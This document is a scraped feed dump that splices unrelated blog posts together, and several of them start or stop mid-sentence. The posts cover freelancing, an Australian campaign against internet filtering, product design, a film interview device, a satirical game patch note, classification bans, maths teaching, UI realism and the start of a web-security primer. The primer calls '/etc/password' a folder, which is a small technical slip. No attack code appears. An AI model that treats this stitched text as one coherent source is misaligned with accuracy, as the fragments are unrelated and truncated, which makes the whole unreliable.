      "content" : "<p>If you’ve been freelancing for more than a week, I’m sure you’ve heard these phrases before. Maybe you’ve been good at spotting them out when someone emails you or maybe you’re new to the freelance life and want to find out what phrases are going to be most common – and ones you should look out for. Whatever your situation, this article is sure to hit home for freelancers around the world.<span></span></p>\n<p>Lets get to it.</p>\n<h3>This is an easy job and I can do this myself, but…</h3>\n<p>Really? You could really do this yourself, but you just so happen to want to give the pleasure of doing your work for you to someone else, for a much cheaper rate and, why? Because you don’t have the time? Because you don’t like doing these types of tasks? I know there are those of us out there who do outsource some work, but I can guarantee you that these words have never been said by someone with an actual skill set.</p>\n<p><strong>What they’re really saying:</strong> I’ve never done anything like this before, but I need to make myself look smart because I think that by doing so, you’ll be scared to give me your real prices and, well, I want to make this entire process as hard on you as I can – as long as it’s great for me.</p>\n<h3>If you can hook me up this time, I’ll send you all of my future work</h3>\n<p>I’m going to go out on a limb and say that this one is what freelancers as a whole see most often – the good old ‘hook me up’ phrase. You’ve got to be cautious of this type of client because they’re never out for your best interests – they’re only looking out for their own.</p>\n<p><strong>What they’re really saying:</strong> Well, I don’t have much money and I don’t really know anybody, but I’m going to lie and tell you I have both because I want to get something for nothing. Are you dumb enough to fall for it? The lint in my pocket sure hopes you are.</p>\n<h3>This is the perfect project for your portfolio</h3>\n<p>Here’s a good one. This is the one where the client seems to think he knows what’s best for you and your portfolio. They just <em>know</em> that the work you’ll do for them will be so fantastic that you’ll want to feature it in your portfolio. This is wrong for a couple of reasons.</p>\n<p>One, this is a red flag that they’re the type of client who thinks they know what’s best. Trust me, it only gets worst from here. This is also a red flag because they’re going to be expecting the type of work you’ll want to feature – killer work, but they’ll rarely have the budget to go with it.</p>\n<p><strong>What they’re really saying:</strong>Hey buddy, I know that you’ve got a good portfolio but I want you to bleed over your keyboard in order to make my work the best you’ve ever done. Oh, and did I mention that my budget is about half of what you’re used to? It’s ok though because the website will look really good in your portfolio.</p>\n<h3>It should only take an experienced person an hour</h3>\n<p>This is one of the things I see most often. I’m guessing there’s an unwritten rule somewhere that states you must put this in your job listing or initial contact email in order to ensure that you’re getting the best price possible.</p>\n<p><strong>What they’re really saying:</strong> I don’t really know anything about what I need done, but what I <em>do</em> know is that I want it done for really cheap, so I’m going to convince you that it’s only a small project – even though you know better.</p>\n<h3>I don’t have a large budget but I can help promote your site</h3>\n<p>This one is kind of a two-for-one when it comes to buzz kill phrases. They’re usually said all at one time like this, but don’t let them fool you if they’re said alone (I don’t have a large budget) and (I can help promote your site) are both individual phrases that should be avoided at all costs.</p>\n<p><strong>What they’re really saying:</strong> I want to get my work done for really cheap and in order to get that done, I’ll tell you that I <em>know people</em> and/or can <em>get you tons of exposure</em>.</p>\n<h3>What do you think?</h3>\n<p>Are there ones we’re missing? Let me know in the comments if you’ve ran across any of these buzz kill phrases before or if you’ve got some that aren’t listed – I know there’s got to be more.</p>\n        <p><center><strong>© <a href=\"http://www.madebyguerrilla.com\">Guerrilla Freelancing</a>  - visit the <a href=\"http://www.madebyguerrilla.com\">Guerrilla Freelancing</a> website for more great content for freelancers.</strong></center></p><br>\n<p><center>Looking for a web/blog designer?

      "content" : "<p>Electronic Frontiers Australia today launched a new campaign against the Rudd Government’s mandatory Internet filtering plan.</p>\n<p>The Open Internet campaign emphasises that Australians want an Open Internet that is free from an impractical and costly policy of Government imposed mandatory Internet filtering.</p>\n<p>“This policy has caused considerable anxiety amongst Australian Internet users,” said EFA Vice-Chair Colin Jacobs. “The idea that the Government will be inserting itself in every Internet connection in the country is a tough one to swallow, especially without a workable policy goal behind it.”</p>\n<p>“Australians support an Open Internet that empowers individuals to decide what they view online,” said Peter Black, EFA’s campaign manager. “Australians support an Open Internet that trusts parents to monitor what their children view online.”</p>\n<p>The campaign is centred around a new website, <a href=\"http://openinternet.com.au/\">OpenInternet.com.au</a>, <a href=\"http://openinternet.com.au/blog/\">blog</a>, and <a href=\"http://www.facebook.com/pages/Open-Internet-for-Australia/312594277816?ref=nf\">Facebook fan page</a>, that together will act as campaign hub for all the different individuals and organisations that are campaigning against the Government’s mandatory Internet filtering policy.</p>\n<p>The policy, which will see all Australian Internet connections subject to a Government-controlled blacklist of banned sites, will apply to all Australian Internet connections within 12 months of the legislation being passed. Although originally touted as a “cyber-safety” policy, the resulting filter will not filter out all material unsuitable for children, instead targeting a select list of “refused classification” material, which would include content dealing with crime, drugs and certain types of adult material.</p>\n<p>Concerns with the list include its broad scope, its secret nature, and the inability of Australian businesses to know if and when they have been placed on the list. “One of our main concerns is how the list might expand in the future,” said Jacobs. “It’s hard to imagine both this government and every government forever, resisting temptation from special interest groups as well as electoral and media pressure.”</p>\n<p>The Open Internet campaign marks an escalation of opposition to the plan, which will continue throughout the year. “Our goal is to ensure the Australian public know what they’re in for,” said Black. “It’s important that such a major and expensive policy gets the public scrutiny it deserves. And we believe that Open Internet portrays a positive and understandable message that will resonate with Australians who are yet to form a strong opinion on the Government’ s policy.”</p>\n<p><span></span>- Ends -</p>\n<p>Below is:</p>\n<p>- Background information<br>\n- Contact details for media</p>\n<p>Background:<br>\n* EFA’s Open Internet campaign<br>\n- http://openinternet.com.au/</p>\n<p>* Electronic Frontiers Australia<br>\n- http://www.efa.org.au/</p>\n<p>About EFA:</p>\n<p>Electronic Frontiers Australia Inc.

      "content" : "<div>By now, everyone is tired of hearing about the iPad, but the negative responses are so perfectly misguided that it would be wrong to waste this opportunity. Even better, we can look back at the 2001 iPod launch and see the exact same mistakes. <b>But this isn&#39;t about the iPad or the iPod -- it&#39;s about product design</b>.</div>  <div><br></div><div>The most famous iPod review was from Slashdot, which simply <a href=\"http://apple.slashdot.org/article.pl?sid=01/10/23/1816257\">declared</a>, &quot;No wireless. Less space than a nomad. Lame.&quot; The iPad reviews are similar in that they focus on the &quot;missing&quot; features. Those missing features are typically available in a variety of unsuccessful competing products, which leads people to erroneously conclude that a successful product would necessarily have <u>even more features</u>!</div>  <div><br></div><div>I believe this &quot;more features = better&quot; mindset is at the root of the misjudgment, and is also the reason why so many otherwise smart people are bad at product design (e.g. most open source projects). If a MacBook with OSX and no keyboard were really the right product, then Microsoft would have already succeeded with their tablet computer years ago. Copying the mistakes of a failed product isn&#39;t a great formula for success.</div>  <div><br></div><div>What&#39;s the right approach to new products? <b>Pick three key attributes or features, get those things very, very right, and then forget about everything else</b>. Those three attributes define the fundamental essence and value of the product -- the rest is noise. For example, the original iPod was: 1) small enough to fit in your pocket, 2) had enough storage to hold many hours of music and 3) easy to sync with your Mac (most hardware companies can&#39;t make software, so I bet the others got this wrong). That&#39;s it -- no wireless, no ability to edit playlists on the device, no support for Ogg -- nothing but the essentials, well executed.</div>  <div><br></div><div>We took a similar approach when launching Gmail. It was fast, stored all of your email (back when 4MB quotas were the norm), and had an innovative interface based on conversations and search. The secondary and tertiary features were minimal or absent. There was no &quot;rich text&quot; composer. The original address book was implemented in two days and did almost nothing (the engineer doing the work originally wanted to spend five days on it, but I talked him down to two since I never use that feature anyway). Of course those other features can be added or improved later on (and Gmail has certainly improved a lot since launch), but if the basic product isn&#39;t compelling, adding more features won&#39;t save it.</div>  <div><br></div><div><b>By focusing on only a few core features in the first version, you are forced to find the true essence and value of the product</b>. If your product needs &quot;everything&quot; in order to be good, then it&#39;s probably not very innovative (though it might be a nice upgrade to an existing product). Put another way, if your product is great, it doesn&#39;t need to be good.</div>  <div><br></div><div>So where does this leave the iPad, with it&#39;s lack of process managers, file managers, window managers, and all the other &quot;missing&quot; junk? I&#39;m not sure, but one thing I&#39;ve noticed is that I spend more time browsing the web from my iPhone than from my laptop. I&#39;m not entirely sure why, but part of it is the simplicity. My iPhone is ready to use in under 1/2 second, while my laptop always takes at least a few seconds to wake up, and then there&#39;s a bunch of stuff going on that distracts me. The iPhone is a simple appliance that I use without a second thought, but my laptop feels like a complex machine that causes me to pause and consider if it&#39;s worth the effort right now. The downside of the iPhone is that it&#39;s small and slow (though the smallness is certainly a feature as well). That alone guarantees that I&#39;ll buy one to leave sitting next to the couch, but I&#39;m kind of atypical.</div>  <div><br></div><div>Ultimately, the real value of this device will be in the new things that people do once they have <b>a fast, simple, and sharable internet window</b> sitting around. At home we&#39;ll casually browse the web, share photos (in person), and play board games (<a href=\"http://friendfeed.com/bret/8f7b52cd/i-am-looking-forward-to-playing-board-games-on\">Bret&#39;s idea</a> -- very compelling). At the office, maybe we&#39;ll finally have an easy way of chatting with remote people while discussing a presentation or document (e.g. audio iChat with a shared display). Of course these things are theoretically possible with laptops, but it always ends up being so clumsy and complicated that we don&#39;t bother (or give up after trying once).</div>  <div><br></div><div>Making the iPad successful is Apple&#39;s problem though, not yours. <b>If you&#39;re creating a new product, what are the three (or fewer) key features that will make it so great that you can cut or half-ass everything else?</b> Are you focusing at least 80% of your effort on getting those three things right?</div>  <div><br></div><div>Disclaimer: This advice probably only applies to consumer products (ones where the purchaser is also the user -- this includes some business products). For markets that have purchasing processes with long lists of feature requirements, you should probably just crank out as many features as possible and not waste time on simplicity or usability.</div>  <div><br></div>"

      "direction" : "ltr",
      "content" : "\n\n\t<p><a href=\"http://bigthink.com/jasonfried\">Big Think Interview With Jason Fried</a></p>\n\n\n\t<p>Was filmed using <a href=\"http://www.errolmorris.com/content/eyecontact/interrotron.html\">Errol Morris’ Interrotron</a> (or a similar device). That’s how you get the direct eye contact. Jason’s take: “Was weird for 5 seconds then it was totally natural.”</p>\n\n\n\t<p>The story of the Interrotron is also a neat example of scratching your own itch. Morris explains:</p>\n\n\n<blockquote>\n\n\t<p>Q: Is it true that you interview people using a machine?</p>\n\n\n\t<p>A:    Yes, the (patent pending) Interrotron. It’s a machine that uses existing technology in a new and novel way. When I made my first film, Gates of Heaven, I interviewed people by putting my head right up against the lens of the camera. It seemed as though they were looking directly into the lens of the camera, but not really. Almost, but not quite. Of course, they were looking a little bit off to the side.</p>\n\n\n\t<p>Q:    What’s wrong with that? What were you trying to achieve?</p>\n\n\n\t<p>A:    The first person. When someone watches my films, it is as though the characters are talking to directly to them… There is no third party. On television we’re used to seeing people interviewed sixty-minutes-style. There is Mike Wallace or Larry King, and the camera is off to the side. Hence, we, the audience, are also off to the side. We’re the fly-on-the-wall, so to speak, watching two people talking. But we’ve lost something.</p>\n\n\n\t<p>Q:    What?</p>\n\n\n\t<p>A:    Direct eye contact.</p>\n\n\n\t<p>Q:    Eye contact?</p>\n\n\n\t<p>A:    Yup. We all know when someone makes eye contact with us. It is a moment of drama. Perhaps it’s a serial killer telling us that he’s about to kill us; or a loved one acknowledging a moment of affection. Regardless, it’s a moment with dramatic value. We know when people make eye contact with us, look away and then make eye contact again. It’s an essential part of communication. And yet, it is lost in standard interviews on film. That is, until the Interrotron.</p>\n\n\n</blockquote>\n\n\t<p>Here’s <a href=\"http://www.whiterabbitdesigncompany.com/Miscellaneous/images/Interrotron.html\">a diagram of how it works</a> and <a href=\"http://www.flickr.com/photos/jkottke/1526404040/\">a photo of the device</a>.</p>\n\n\n\t<p><a href=\"http://www.whiterabbitdesigncompany.com/Miscellaneous/images/Interrotron.html\"><img src=\"http://s3.amazonaws.com/37assets/svn/interrotron%20web%20page.jpg\" width=\"530\" height=\"382\" alt=\"interrotron\"></a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=lw9ojyl0s3g:CSek--Lr3YY:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=lw9ojyl0s3g:CSek--Lr3YY:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

Why would Valve even hire someone with a horseshoe-shaped divot in their skull?\" is an email we see a lot. \"Does Matthew Russell have a disease that makes him lazy?\" is another popular one. An astonishing number of them are simply a .jpeg of Google Maps with Matt's house ominously circled. The rest could be summed up as a long, unbroken string of expletives and grammatically questionable racial slurs.<br><br><br><br>What a lot of people don't know is that this \"bug\" isn't a bug at all, but rather an embarrassing result of the degenerative leg disease our motion capture actor, Del Bluskin, has bravely endured for over a decade now, which has turned the lower half of his skeleton into something that looks like two raw bacon strips held up in a wind tunnel. To be honest, Del's been a part of the Valve family for so long, we just didn't have the heart to fire him simply because his ailment had rendered him grossly incompetent at his own job. To be even more honest, we didn't have the heart to engage in a long verbal sparring match with Valve's legal team, who told us that under no circumstances could we fire Del.<br><br><br><br>Luckily, things have a funny way of working themselves out for the best. Del was hit by a bus this morning, and our new mocap guy, Phil, is a sharp, enthusiastic go-getter with a functioning skeleton. Jump forward an hour, and here we are with an upgrade that finally addresses the Double Crouch Jump bug that has long plagued the Scout-playing faithful. Enjoy, and in the words of animator Matthew Russell, \"Anyone wants me, I'm gonna snag a couple z's in the server room. If Newell asks, one of my kids has chicken pox again.\"<br><br><br><br>In non-crazy-legs-related news, our friends at TF2maps.net have just finished up their <a href=\"http://swamp.tf2maps.net/\">Swamp Theme expansion</a>. Head on over and download it today.<br>"

It comes just a week after it was found that material with depictions of <a href=\"http://www.msnaughty.com/blog/2010/01/16/the-strange-politics-of-obscene-bodily-fluids/\">females ejaculating during orgasm are now Refused Classification</a> and Australian Customs directed to confiscate it.</p>\n<p>ASP’s Fiona Patten writes on her party’s website that they are starting to see depictions of women in their late 20s being banned because they have an A cup breast size:</p>\n<blockquote><p><em>“This is in response to a campaign led by Kids Free 2 B Kids and promoted by Barnaby Joyce and Guy Barnett in Senate Estimates late last year. <strong>Mainstream companies such as Larry Flint’s Hustler produce some of the publications that have been banned.</strong> These companies are regulated by the FBI to ensure that only adult performers are featured in their publications.”</em></p></blockquote>\n<p>Patten writes that such bans may be an unintended consequence of the Senator’s actions “but they are largely responsible for the sharp increase in breast size in Australian adult magazines of late”.</p>\n<p><span style=\"text-decoration:underline\"><strong>How can this be happening</strong></span></p>\n<p>The <a href=\"http://www.comlaw.gov.au/ComLaw/Legislation/LegislativeInstrument1.nsf/framelodgmentattachments/A4DD01BB110AD94DCA25700D002EF73E\">National Classification Code</a> dictates that anything that describes or depicts a person who is, <strong>or appears to be</strong>, a child under 18 (whether the person is engaged in sexual activity or not) in a way that is likely to cause offence to a reasonable adult is Refused Classification.</p>\n<p>State Crime Acts are also similar. <a href=\"http://www.austlii.edu.au/au/legis/vic/consol_act/ca195882/s67a.html\">Victoria’s Criminal Code</a> includes the ‘or appears to be’ clause in its definition of child pornography and it doesn’t need to cause offence to a reasonable adult for it to be illegal.</p>\n<p>Even if you are 18 years old but you look younger, taking a photograph of your breasts and uploading it to the Internet could land you or someone you know in serious trouble.</p>\n<p>Keep in mind it’s highly unlikely that a naked photograph of a 30, 40 or 50 year old woman with small breasts would ‘appear’ to be child pornography on the basis of her breast size alone. Small breasts do not automatically mean something will be banned or is illegal.</p>\n<p><span style=\"text-decoration:underline\"><strong>A bad message</strong></span></p>\n<p><a href=\"http://www.msnaughty.com/blog/2010/01/27/now-australia-is-banning-small-boobs/\">Australian adult blogger <em>Ms Naughty</em></a> says we need to look at what this ruling says to Australian women:</p>\n<blockquote><p><em>“Why ban small boobs? I can only assume it stems from paranoia that flat chests somehow stir up the pedophiles. And you only need to mention that “p” word to start a full-scale moral panic in Parliament.”</em></p>\n<p><em>“Shall we put such hysteria aside and look at what this ruling is saying to Australian women? Basically, it’s classing a certain normal female body type as obscene. It’s declaring all flat chests to be automatically juvenile, something that should not be viewed by anyone because of a fear that it will stir up “base instincts” in certain people.”</em></p>\n<p><em>“Can the Classification Board be any more insulting or sexist?”</em></p></blockquote>\n<p><span style=\"text-decoration:underline\"><strong>Ejaculations<br>\n</strong></span></p>\n<p>According to Patten, female ejaculations films are being Refused Classification on one of two grounds:</p>\n<ol>\n<li>That the depictions are a form of urination which is banned under the label of ‘golden showers’ in the Classification Guidelines or</li>\n<li>Female ejaculation is an ‘abhorrent’ depiction</li>\n</ol>\n<p>“Films that show both male and female ejaculation have routinely been given an X rating since 1983″ said Patten. “The new ruling follows a boom in the numbers of adult films featuring female ejaculation since the pioneering research of Professor Emeritus Beverly Whipple was published in her book The G Spot.”</p>\n<p>Content Refused Classification will be blocked to Australian adults under the Government’s planned Internet censorship scheme.</p>\n<blockquote><p><em>“There are over one million sites featuring female ejaculation and for Australia to be banning depictions and discussion of this important issue, takes us back into the Victorian era where they didn’t even believe that women could have orgasms.”</em></p></blockquote>\n<p>The ACB has been contacted for comment.<em></em></p>\n<div style=\"background-color:#f5fffa;padding:5px;border:1px #eee solid\">\n<p><strong>UPDATES:</strong></p>\n<p><strong>28/01/10: </strong><a href=\"http://www.somebodythinkofthechildren.com/classification-board-responds-to-small-breasts-ban/\"><strong>Government respond to STotC and more details from The Australian Sex Party</strong></a></p>\n<p><strong>29/01/10 12:19PM: </strong><a href=\"http://www.somebodythinkofthechildren.com/classification-board-responds-to-small-breasts-ban#aspupdate\"><strong>Additional comments from ASP — Underdeveloped nature of the model’s breasts was cited as a reason for an image being refused classification numerous times.</strong></a></p>\n<p><strong>01/02/10: <a href=\"http://www.somebodythinkofthechildren.com/appearance-persons-age-no-comment-on-breast-size/\">Classification Board confirms your appearance can determine your age, but refuses to comment on breast size</a></strong>.</p></div>\n<img src=\"http://feeds.feedburner.com/~r/SomebodyThinkOfTheChildren/~4/mkyu-l7qJdQ\" height=\"1\" width=\"1\">"

Each van seats 7 persons, including the driver. Each car seats 5 persons, including the driver. How many vans and cars will be needed?</p></blockquote>\n<p><strong><font size=\"+1\">Background</font></strong></p>\n<p>Tuesday was an all-school professional development day. The math departments joined from two campuses to learn about the <a href=\"http://www.literacyleader.com/?q=node/477\">Gradual Release of Responsibility</a> from a couple of math coaches from the next county over.</p>\n<p>One coach modeled a GRR lesson and opened with the problem above.</p>\n<p>I leaned into another teacher and whispered, \"I'm trying to decide which would be more socially acceptable right now, letting out a loud fart or saying what I really think about this problem.\"</p>\n<p>We broke for lunch and came back to debrief. No one had commented on the problem by the end so I did.</p>\n<p>\"I see problems like this and I feel myself becoming less of a human and more of a math teacher. And I feel very lucky to teach our neediest students, students who punish me daily for problems like this one, students who are often very hard on me but who in return have helped me hold onto some of that humanity.</p>\n<p>\"I have three questions about this problem and we can discuss any of them or none of them.\"</p>\n<p><strong><font size=\"+1\">Three Questions</font></strong></p>\n<p>\"One, is the problem realistic? Would a real person need to solve this problem?</p>\n<p>\"Two, is the solution realistic? Would a real person solve the problem using a system of two equations?</p>\n<p>\"Three, in what ways does this problem help our students become better problem solvers?\"</p>\n<p><strong><font size=\"+1\">Elaboration</font></strong></p>\n<p>I didn't elaborate. I thought my questions were self-evident and their answers self-explanatory. I was wrong. The coach shrugged me off, saying, \"Well, it's in <em>your</em> textbook.\" and I couldn't disagree. None of my colleagues seemed disturbed by the opening exercise of this quote model lesson unquote, so I didn't belabor the point. In hindsight, I wish I had soapboxed:</p>\n<ol>\n<li><strong>This is a problem you will only find in a math textbook.</strong> It's bizarre to me how many different ways just fifty words can fail to square with reality. Why does each chaperone have to drive? Why can't we take five vans? Why do our vehicles have to seat the exact number of people in our group and no more?</li>\n<li><strong>No youth group leader would ever solve this problem with a system of equations.</strong> I'd wager that no <em>math teacher</em>, if somehow faced with this completely fantastic scenario, would solve this problem with a system of equations. With 31 people, we&#39;d just shuffle them around until they fit. Even if we insisted on the contrivances in #1, there are only [0, 5] possibilities for the vans so we&#39;d use a table or just guess and check. ¶ I asked the coach why we were forcing the issue of systems when the easiest solution by a long shot was tables. She replied that we learned tables last class and this is the new skill we&#39;re learning.</li>\n<li><strong>This kind of algebra makes our students dumb, unimaginative, and scared of real problems.</strong> At the end of the model lesson, the coach put up our homework, which was <em>a carbon copy</em> of the original problem, new numbers swapped in for the old. ¶ I can&#39;t describe my contempt for this arrangement. ¶ This is how we make kids stupid and impatient with irresolution, eager for contrived problems that look just like the last contrived problem, completely lost if we so much as switch around the order of a few words. &quot;We don&#39;t teach them problem solving skills anymore,&quot; my department head said to me. &quot;We teach them problem <em>types</em>.\"</li>\n</ol>\n<p>Algebra teachers sell students a cheap distortion of the real world while insisting at the same time that it really <em>is</em> the real world. The cognitive dissonance is obvious and terrible. Students know the difference. It cheapens my relationship to them and their relationship to mathematics when you ask me to lie to them.</p>\n<p>It's like offering someone lust or manipulation while insisting that it's love. Not only are the short-term consequences devastating but it makes that person distrustful or wary of the real thing. Make no mistake. We are making an alien of algebra. We are doing real damage here.</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/dydan1?a=97gS4E7XmSU:LcEF5eGirRg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/dydan1?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/dydan1?a=97gS4E7XmSU:LcEF5eGirRg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/dydan1?i=97gS4E7XmSU:LcEF5eGirRg:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/dydan1?a=97gS4E7XmSU:LcEF5eGirRg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/dydan1?i=97gS4E7XmSU:LcEF5eGirRg:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/dydan1/~4/97gS4E7XmSU\" height=\"1\" width=\"1\">"

      "direction" : "ltr",
      "content" : "<p>The history of the visual design of user interfaces can be described as a gradual change towards more realism. As computers have become faster, designers have added increasingly realistic details such as color, 3D effects, shadows, translucency, and even simple physics. Some of these changes have helped usability. Shadows behind windows help us see which window is active. The physicality of the iPhone’s user interface makes the device more natural to use.</p>\n\n<p>In other areas, the improvements are questionable at best. Graphical user interfaces are typically full of symbols. Most graphical elements you see on your screen are meant to stand for ideas or concepts. The little house on your desktop isn’t a little house, it’s «home». The eye isn’t an actual eye, it means «look at the selected element». The cog isn’t a cog, it means «click me to see available commands». You are typically not trying to replicate physical objects, you are trying to communicate concepts.</p>\n\n<p>Details and realism can distract from these concepts. To explain this, I’ll take a page from <a href=\"http://en.wikipedia.org/wiki/Understanding_Comics\">Scott McCloud’s «Understanding Comics»</a>, a book which <a href=\"http://www.amazon.com/Understanding-Comics-Invisible-Scott-Mccloud/dp/006097625X\">should be required reading for all designers</a>.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/faces_1.png\" alt=\"Understanding Comics\"></p>\n\n<p>The image on the left is a face of a specific person. The image on the right is the concept «face»; it could be any person. When designing user interfaces, we rarely ever want to show a specific entity; typically, we want to convey an idea or a concept. Details can easily distract from that idea or concept.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/photo_pictures.png\" alt=\"Symbol vs. Photo\"></p>\n\n<p>At the same time, it’s obvious that some details are required. Too few details, and the user won’t recognize the idea at all.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/faces_2.png\" alt=\"What&#39;s in a face?\"></p>\n\n<p>The circle on the left clearly shows a face. The circle on the right isn’t recognizable as a face anymore.</p>\n\n<p>Let’s look at a symbol we actually see in user interfaces, the home button. Typically, this button uses a little house as its symbol.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/home_buttons.png\" alt=\"Home Buttons\"></p>\n\n<p>The thing on the left is a house. The thing on the right means «home». Somewhere between the two, the meaning switches from «a specific house» to «home as a concept». The more realistic something is, the harder it is to figure out the meaning. Again, if the image is simplified too much, it’s not clearly and immediately recognizable anymore.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/home_button_2.png\" alt=\"Home Buttons losing details\"></p>\n\n<p>The thing on the left is a home button. The thing on the right might as well be an arrow pointing up; or perhaps it’s the ⇧ key.</p>\n\n<p>Let me explain this concept using an entirely unscientific graph:</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/confusion_cognition.png\" alt=\"Cognition\"></p>\n\n<p>People are confused by symbols if they have too many or too few details. They will recognize UI elements which are somewhere in the middle.</p>\n\n<p>The trick is to figure out which details help users identify the UI element, and which details distract from its intended meaning. Some details help users figure out what they’re looking at and how they can interact with it; other details distract from the idea you’re trying to convey. They turn your interface element from a concept into a specific thing. Thus, if an interface element is too distinct from its real-life counterpart, it becomes too hard to recognize. On the other hand, if it is too realistic, people are unable to figure out that you’re trying to communicate an idea, and what idea that might be.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/buttons.png\" alt=\"Buttons\"></p>\n\n<p>The button on the left is too realistic. The button on the right does not have enough details to be immediately recognizable as a button.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/toggles.png\" alt=\"Toggles\"></p>\n\n<p>The same applies to these toggles. Shadows and gradients help the user figure out what he’s looking at and how to interact with it. Adding too many details, however, ends up being confusing. The toggle switch is no longer just a toggle switch that is part of a user interface, it is clearly recognizable as a photograph of a specific toggle switch; it loses its meaning. It’s no longer a symbol, it has become a specific thing.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/home.png\" alt=\"Home Button\"></p>\n\n<h1>An Exception</h1>\n\n<p>There is at least one specific area where more details are good: Application icons. You <em>want</em> your icon to depict one specific idea: Your application.</p>\n\n<p><img src=\"http://ignorethecode.net/upload/240/application_icons.png\" alt=\"Application Icons\"></p>\n\n<p><a href=\"http://www.panic.com/coda/\">Coda’s leaf</a> isn’t a representation of the idea of a leaf; it’s a very specific leaf, the Coda leaf. <a href=\"http://flyingmeat.com/acorn/\">Acorn’s acorn</a> isn’t just any acorn, it’s <em>the</em> Acorn. Adding details moves these images from a generic concept towards a specific entity, and in the case of an application icon, this is exactly what you want.</p>\n\n<h1>Conclusion</h1>\n\n<p>Graphical user interfaces are full of symbols. Symbols need to be reduced to their essence. This helps avoid cluttering the user interface with meaningless distractions, and makes it easier for people to «read» the symbol and figure out the meaning of an interface element. Realistic details can get in the way of what you’re trying to communicate to your users.</p>\n\n<p>Unless you are creating a virtual version of an actual physical object, the goal is not to make your user interface as realistic as possible. The goal is to add those details which help users identify what an element is, and how to interact with it, and to add no more than those details. UI elements are abstractions which convey concepts and ideas; they should retain only those details that are relevant to their purpose. UI elements are almost never representations of real things. Adding too much realism can cause confusion.</p>\n\n<p><em>Thanks to <a href=\"http://twitter.com/maxsteenbergen\">Max Steenbergen</a> and <a href=\"http://cameron.io/\">Cameron Kenley Hunt</a> for helping me form a coherent opinion on this topic.<br>\nThe second house icon <a href=\"http://www.iconfinder.net/icondetails/17008/128/\">is from Dellustrations’s icon set «Dellipack»</a>.</em></p>\n<br><br><p>If you require a short url to link to this article, please use <b><a href=\"http://ignco.de/240\">http://ignco.de/240</a></b></p><img src=\"http://feeds.feedburner.com/~r/IgnoreTheCode/~4/L8lA567plyQ\" height=\"1\" width=\"1\">"

Ineffective Web security leads to all of the things that make us hate the Web: spam, viruses, identity theft, to name a few.</p><p>The problem with Web security is that, as important as it is, it is also very complex. I am quite sure that some of you reading this are already part of an network of attack computers and that your servers are sending out spam messages without you even knowing it. Your emails and passwords have been harvested and resold to people who think you need either a new watch, a male enhancement product or a cheap mortgage. Fact is, you are part of the problem and don’t know what you did to cause it.</p><p>The reason is that security experts don’t like to talk too much in public about what they do and where the issues lie; and sadly enough, they can also come across as arrogant in their views. This could be the result of people not taking security seriously and not following the most basic advice, such as using passwords that are clever, not “password” or “letmein.”</p><p>Another reason is those tutorials that show you how to “do something in five minutes” and conveniently neglect to mention the security implications of their advice. If it sounds too easy to be true, it probably is. A perfect example of this is PHP solutions that use a file for data storage and ask you to make it writable to the world. This is easy to implement, but it means that any spammer can write to this file.</p><p><strong>Disclaimer</strong>: the things we’ll talk about in this article today won’t make you a security expert, just as buying a Swiss Army knife won’t make you a locksmith or buying a whip won’t make you a lion tamer.

Unmentioned are a newer threat, clickjacking, and a user interface issue called phishing. You may have to deal with all of these as a Web developer if you touch PHP and HTML, CSS and JavaScript. Even if you don’t use PHP, you could still cause a lot of problems. Even if you don’t touch code and simply design, you could be a great asset in this area. You could help make the Web safer by making security issues understandable to your users.</p><p>Let’s go through all of these things and explain what they are and do. The first thing you need to know, though, is how URIs work.</p><h3>URIs: The Main Way To Attack A Web Service</h3><p>The address of any document (i.e. file on the Internet) is its <a href=\"http://en.wikipedia.org/wiki/Uniform_Resource_Identifier\">Uniform Resource Identifier</a> (URI). This is what you enter in the browser bar to access the document and what you embed into code to point to the document. For example, my website address is <code>http://icant.co.uk</code>, and the document you see when you open it in a browser is <code>http://icant.co.uk/index.php</code> (the server automatically redirects to that document). The logo image resides at the URI <code>http://icant.co.uk/iconslogo.png</code>, and the image of me pointing at you is on a totally different server and has the URI <code>http://farm4.static.flickr.com/3172/3041842192_5b51468648.jpg</code>.</p><p>All of these URIs are okay for you to access. Some URIs, though, contain information that should not be accessible to the outside world. For example, the <code>/etc/password</code> folder on a server contains password and user information that should not leak to the Internet.</p><p>Every URI can also contain parameters. These are instructions you can send to the script located at that URI and that are appended to the URI starting with a <code>?</code> and separated by ampersands. If you want to search for puppies on Google, for example, you can use the URI <code>http://www.google.com/search?q=puppies</code>, and if you want to begin your search after the first 50 results, you can use <code>http://www.google.com/search?q=puppies&amp;start=50</code>.</p><p>Normally, these parameters are not entered by end users but rather come from the HTML interface. If you look at the source code of the Google home page and get rid of the painful bits, you end up with the following form:</p><pre>&lt;form name=&quot;f&quot; action=&quot;/search&quot;&gt;\n  &lt;input type=&quot;hidden&quot; value=&quot;en&quot; name=&quot;hl&quot;/&gt;\n  &lt;input type=&quot;hidden&quot; value=&quot;hp&quot; name=&quot;source&quot;/&gt;\n  &lt;input name=&quot;q&quot;/&gt;\n  &lt;input type=&quot;submit&quot; name=&quot;btnG&quot;/&gt;\n  &lt;input type=&quot;submit&quot; name=&quot;btnI&quot;/&gt;\n  &lt;input type=&quot;hidden&quot; name=&quot;aq&quot;/&gt;\n  &lt;input type=&quot;hidden&quot; 